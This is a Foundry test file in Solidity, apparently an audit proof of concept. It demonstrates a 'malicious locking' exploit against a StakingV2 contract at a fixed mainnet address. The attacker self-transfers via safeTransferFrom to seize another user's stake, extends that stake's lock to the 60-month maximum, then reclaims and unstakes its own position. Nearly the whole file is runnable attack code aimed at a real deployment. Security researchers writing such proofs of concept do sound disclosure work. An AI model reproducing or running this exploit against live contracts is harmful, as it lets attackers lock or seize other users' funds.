// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "forge-std/Test.sol";
import "StakingV2/contracts/staking/StakingV2.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ContractTest is Test {
    using stdStorage for StdStorage;

    IERC20 yopToken = IERC20(0xAE1eaAE3F627AAca434127644371b67B18444051);
    StakingV2 staking = StakingV2(0x5B705d7c6362A73fD56D5bCedF09f4E40C2d3670);
    address attacker1 = address(1);
    uint8 MAX_STAKE_DURATION_MONTHS = 60;
    uint256 public constant SECONDS_PER_MONTH = 2629743; // 1 month/30.44 days

    function setUp() public {
        deal(address(yopToken), attacker1, 500 ether);
    }

    function testYopMaliciousLocking() public {
        //Impersonate attacker1 for subsequent calls to contracts
        startHoax(attacker1);
        uint8 lock_duration_months = 1;
        uint realStakeId = 127;
        uint additionalAmount = 0;

        //Create a staking position
        yopToken.approve(address(staking), 500 ether);
        uint attackerStakeId = staking.stake(500 ether, 1);
        staking.safeTransferFrom(attacker1, attacker1, realStakeId, additionalAmount, '');

        //The stake with id 127 is locked for 3 months
        uint8 lockTimeRealStakeId = 3;
        
        //We lock the stake for the maximal duration
        staking.extendStake(
            realStakeId,
            MAX_STAKE_DURATION_MONTHS-lockTimeRealStakeId,
            0,
            new address[](0)
        );

        //Attacker has no longer control over his initial stake
        //But he can use the same vulnerability to transfer it back to himself.
        staking.safeTransferFrom(attacker1, attacker1, attackerStakeId, additionalAmount, '');

        //Standard cheat for elapsing given time in seconds
        skip(lock_duration_months*SECONDS_PER_MONTH+1);
        staking.unstakeSingle(attackerStakeId, attacker1);
    }
}
